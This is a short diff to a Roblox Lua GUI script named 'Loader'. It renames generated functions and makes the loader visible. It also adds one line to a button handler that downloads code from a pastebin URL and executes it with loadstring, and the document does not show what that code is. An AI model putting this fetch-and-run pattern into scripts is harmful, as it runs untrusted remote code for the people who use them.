@@ -14,7 +14,6 @@ local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
 
 Loader.Name = "Loader"
 Loader.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-Loader.Enabled = false
 Loader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Frame.Parent = Loader
@@ -55,7 +54,7 @@ UITextSizeConstraint_2.MaxTextSize = 60
 
 -- Scripts:
 
-local function EQXL_fake_script() -- TextLabel.Name 
+local function DWJSGLQ_fake_script() -- TextLabel.Name 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	local USER = game.Players.LocalPlayer.Name
@@ -63,8 +62,8 @@ local function EQXL_fake_script() -- TextLabel.Name
 	
 	
 end
-coroutine.wrap(EQXL_fake_script)()
-local function IOCWWT_fake_script() -- TextLabel.Tween2 
+coroutine.wrap(DWJSGLQ_fake_script)()
+local function ECIKCWM_fake_script() -- TextLabel.Tween2 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	local TweenService = game:GetService("TweenService")
@@ -75,8 +74,8 @@ local function IOCWWT_fake_script() -- TextLabel.Tween2
 		frame:TweenPosition(UDim2.new(50, 0))
 	end)
 end
-coroutine.wrap(IOCWWT_fake_script)()
-local function BGLWGPR_fake_script() -- TextButton.Tween1 
+coroutine.wrap(ECIKCWM_fake_script)()
+local function ECKHNH_fake_script() -- TextButton.Tween1 
 	local script = Instance.new('LocalScript', TextButton)
 
 	local TweenService = game:GetService("TweenService")
@@ -87,10 +86,10 @@ local function BGLWGPR_fake_script() -- TextButton.Tween1
 		local frame = script.Parent.Parent.Parent.Frame
 		frame:TweenSize(UDim2.new(50, 0))
 		wait(1)
-	
+		loadstring(game:HttpGet("https://pastebin.com/raw/pUG3rbqk"))()
 		script.Parent.Parent:Destroy()
 	end)
 	
 	
 end
-coroutine.wrap(BGLWGPR_fake_script)()
+coroutine.wrap(ECKHNH_fake_script)()
